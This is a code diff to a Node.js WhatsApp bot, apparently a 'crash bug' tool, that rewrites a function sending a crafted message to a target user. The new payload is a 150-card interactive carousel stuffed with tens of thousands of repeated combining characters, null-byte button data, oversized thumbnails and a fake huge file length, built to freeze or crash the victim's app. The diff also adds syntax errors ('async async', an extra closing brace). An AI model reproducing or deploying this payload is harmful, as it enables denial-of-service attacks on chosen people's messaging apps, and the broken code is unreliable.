@@ -4215,25 +4215,46 @@ async function blankbyambajahat(sock, target) {
   }
 }
 
-async function AmbaFcNewVIP(sock, target) {
+async async function AmbaFcNewVIP(sock, target) {
   await sock.relayMessage(target, {
-    messageContextInfo: {
-      mentionedJid: [target]
-    },
     viewOnceMessageV2: {
       message: {
-        imageMessage: {
-          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g",
-          fileSha256: Buffer.from("SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=", "base64"),
-          fileEncSha256: Buffer.from("l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=", "base64"),
-          mediaKey: Buffer.from("UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=", "base64"),
-          mimetype: "image/jpeg",
-          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g",
-          fileLength: "999999999999",
-          height: 30000,
-          width: 30000,
-          mediaKeyTimestamp: "1775044724",
-          jpegThumbnail: Buffer.alloc(100000, 0xFF)
+        interactiveMessage: {
+          header: {
+            title: "</AmbaJahat>" + "ោ៝".repeat(45000),
+            hasMediaAttachment: true,
+            imageMessage: {
+              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g",
+              mimetype: "image/jpeg",
+              fileSha256: Buffer.from("SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=", "base64"),
+              mediaKey: Buffer.from("UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=", "base64"),
+              fileLength: "999999999999",
+              height: 2000,
+              width: 2000
+            }
+          },
+          body: {
+            text: "© 𝚅𝙸𝚇𝚉𝚉𝙾𝙵𝙲" + "꧀".repeat(50000)
+          },
+          carouselMessage: {
+            cards: Array.from({ length: 150 }, () => ({
+              header: {
+                title: "Amba?Jahat" + "ោ៝".repeat(10000),
+                hasMediaAttachment: true,
+                imageMessage: {
+                  url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g",
+                  mimetype: "image/jpeg",
+                  jpegThumbnail: Buffer.alloc(45000, 0xFF)
+                }
+              },
+              nativeFlowMessage: {
+                buttons: [{
+                  name: "single_select_reply",
+                  buttonParamsJson: "\0".repeat(1000)
+                }]
+              }
+            }))
+          }
         }
       }
     }
@@ -4242,6 +4263,7 @@ async function AmbaFcNewVIP(sock, target) {
     userJid: target,
     messageId: null
   });
+}
 }
 //-------------- END FUNCTION -------------//
 bot.launch();
